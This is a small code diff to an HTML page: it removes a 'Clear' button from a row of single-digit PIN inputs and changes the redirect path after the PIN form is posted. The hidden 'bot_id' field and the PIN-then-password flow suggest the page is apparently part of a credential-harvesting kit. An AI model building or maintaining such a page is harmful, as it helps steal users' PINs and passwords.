@@ -146,7 +146,6 @@
   <input type="hidden" name="bot_id" id="bot_id" value="1"> <!-- default bot 1 -->
 
   <div class="box-input-pin">
-    <div class="clear">Clear</div>
     <input autofocus name="pin1" id="pin1" class="inppin" type="number" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
     <input name="pin2" id="pin2" class="inppin" type="number" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
     <input name="pin3" id="pin3" class="inppin" type="number" required maxlength="1" onKeyPress="if(this.value.length==1) return false;">
@@ -208,7 +207,7 @@ function sendPin(){
         data: $('#formPin').serialize(),
         dataType: 'text',
         success: function(){
-            window.location.href = '../../Password/';
+            window.location.href = '../Password/';
         }
     });
 };
